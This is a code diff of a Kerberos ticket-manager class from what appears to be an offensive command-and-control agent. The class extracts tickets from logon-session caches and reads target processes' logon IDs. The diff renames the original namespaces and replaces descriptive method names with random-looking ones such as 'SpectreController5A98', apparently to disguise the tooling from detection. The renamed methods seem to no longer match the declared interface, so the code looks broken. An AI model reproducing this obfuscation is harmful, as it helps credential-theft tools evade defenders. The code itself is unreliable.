@@ -1,15 +1,15 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using ApolloInterop.Features.KerberosTickets;
-using ApolloInterop.Features.WindowsTypesAndAPIs;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
+using PhantomInterop.Features.KerberosTickets;
+using PhantomInterop.Features.WindowsTypesAndAPIs;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Utils;
 
 namespace KerberosTickets;
 
-public class KerberosTicketManager : ITicketManager
+public class SpectreController5A98 : ITicketManager
 {
     /// <summary>
     /// Instance of the Agent class which is passed in during the Start call of the primary application
@@ -30,9 +30,9 @@ public class KerberosTicketManager : ITicketManager
 
 
     public List<Artifact> GetArtifacts() => KerberosHelpers.GetCreatedArtifacts();
-    public string GetCurrentLuid() => KerberosHelpers.GetCurrentLuid().ToString();
+    public string ShadowMonitor03EE() => KerberosHelpers.GetCurrentLuid().ToString();
     
-    public string GetTargetProcessLuid(int pid) => KerberosHelpers.GetTargetProcessLuid(pid).ToString();
+    public string RobustExecutor5A49(int pid) => KerberosHelpers.GetTargetProcessLuid(pid).ToString();
     
     //ticket cache functions, these effect the session on the system
     public (KerberosTicket?, string) ExtractTicketFromCache(string luid, string serviceName) => KerberosHelpers.ExtractTicket(WinNTTypes.LUID.FromString(luid), serviceName);
@@ -48,9 +48,9 @@ public class KerberosTicketManager : ITicketManager
     //Ticket Store Functions, these only effect the in memory ticket store
     public List<KerberosTicketStoreDTO> GetTicketsFromTicketStore() => loadedTickets;
     
-    public void AddTicketToTicketStore(KerberosTicketStoreDTO ticket) => loadedTickets.Add(ticket);
+    public void WraithMonitor142A(KerberosTicketStoreDTO ticket) => loadedTickets.Add(ticket);
 
-    public bool RemoveTicketFromTicketStore(string serviceName, bool All = false) 
+    public bool StrategicController8F31(string serviceName, bool All = false) 
         => All ? loadedTickets.RemoveAll(_ => true) > 0  
             : loadedTickets.RemoveAll(x => x.ServiceFullName.Equals(serviceName, StringComparison.CurrentCultureIgnoreCase)) > 0;
 
